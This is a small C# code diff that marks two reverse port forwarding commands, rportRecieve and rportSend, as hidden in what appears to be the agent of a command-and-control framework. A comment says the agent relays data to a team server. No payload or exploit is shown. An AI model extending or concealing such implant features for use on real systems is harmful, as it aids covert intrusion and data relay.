@@ -81,6 +81,7 @@ namespace Engineer.Commands
     internal class rportRecieve : EngineerCommand
     {
         public override string Name => "rportRecieve";
+        public override bool IsHidden => true;
 
         public override async Task Execute(EngineerTask task)
         {
@@ -104,6 +105,7 @@ namespace Engineer.Commands
     internal class rportSend : EngineerCommand
     {
         public override string Name => "rportsend";
+        public override bool IsHidden => true;
 
         //is used to send the data to the TS from the client
         public override async Task Execute(EngineerTask task)
